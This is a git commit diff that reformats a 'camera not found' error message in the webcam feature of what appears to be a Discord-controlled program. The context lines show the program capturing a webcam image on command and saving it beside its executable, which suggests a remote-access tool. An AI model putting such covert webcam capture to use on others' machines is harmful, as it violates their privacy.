4207cc02956eae17d53e5d4bbebae8ae4b8139f6
YawDev <nik.xeiladakis@gmail.com>
2024-07-16 03:34:36 +0300

    format camera not found msg

--- resources/features/webcam.py
+++ resources/features/webcam.py
@@ -18,7 +18,7 @@ async def webcam(ctx, action=None, camera_index=None):
             camera = pygame.camera.Camera(camera_index)
             camera.start()
         except: 
-            return await ctx.send('Camera with index ' + str(camera_index) + ' was not found.')
+            return await ctx.send('```❗ Camera with index ' + str(camera_index) + ' was not found.```')
         time.sleep(1)
         image = camera.get_image()
         pygame.image.save(image, f'{os.path.dirname(sys.executable)}\\webcam.png')
